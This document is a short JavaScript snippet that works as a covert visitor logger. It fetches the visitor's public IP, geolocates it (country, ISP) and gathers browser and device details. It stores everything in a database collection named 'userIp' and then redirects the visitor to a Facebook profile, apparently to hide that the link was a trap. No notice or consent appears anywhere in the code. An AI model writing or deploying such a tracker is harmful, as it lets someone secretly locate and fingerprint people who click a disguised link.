fetch('https://api.ipify.org/?format=json')
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip;
    

    fetch(`https://api.iplocation.net/?ip=${ipAddress}`)
      .then(response => response.json())
      .then(data => {

        const geoBasicInfo = {
            ip_number: data.ip_number,
            ip_version: data.ip_version,
            country_name: data.country_name,
            country_code2: data.country_code2,
            isp: data.isp,
        }

        const deviceInfo = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          screenWidth: window.screen.width,
          screenHeight: window.screen.height,
          networkeffectiveType: navigator.connection.effectiveType,
          networkdownlink: navigator.connection.downlink,
        };

        console.log(deviceInfo);

        db.collection("userIp").add({
            ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
        }).then(_ => {
            window.location.replace("http://www.facebook.com/profile.php?")
        });
      })
      .catch(error => {
        console.error(error);
      });



  })
  .catch(error => {
    console.error(error);
  });
